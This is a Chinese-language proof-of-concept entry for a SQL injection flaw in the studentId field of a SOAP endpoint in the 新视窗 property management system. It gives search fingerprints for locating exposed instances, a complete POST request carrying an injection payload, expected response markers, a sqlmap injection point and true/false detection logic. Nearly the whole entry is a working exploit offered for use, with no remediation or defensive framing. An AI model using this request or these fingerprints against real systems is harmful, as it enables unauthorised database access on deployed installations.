﻿# 新视窗-studentld-SQL注入漏洞

> 更新时间：2024-04-22

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：body="localStorage.LoginInfo=null"||body="skins/v8_green/images/loginv8_New.png"||app="新视窗新一代物业管理系统"

> 验证脚本：HTTP

```
POST /OfficeManagement/RegisterManager/Report/Training/Report/GetprintData.asmx HTTP/1.1
Accept-Encoding: gzip, deflate, br
Accept: */*
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/GetCertificateInfoByStudentId"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetCertificateInfoByStudentId xmlns="http://tempuri.org/">
      <studentId>1--+'</studentId>
    </GetCertificateInfoByStudentId>
  </soap:Body>
</soap:Envelope>
```

> 响应代码特征：200

> 响应内容特征：GetCertificateInfoByStudentIdResponse

> 上传文件定位：

> 验证文件来源：新视窗-studentld-SQL注入漏洞.poc

```
进一步poc验证：
sqlmap：<studentId>*</studentId>
url1=<studentId>1</studentId>
url2=<studentId>1'</studentId>
url3=<studentId>1--+'</studentId>
response1.text=GetCertificateInfoByStudentIdResponse
response2.text=报错
response3.text=GetCertificateInfoByStudentIdResponse

if response1.text==response3.text and response1.text!=response2.text:
   return True
```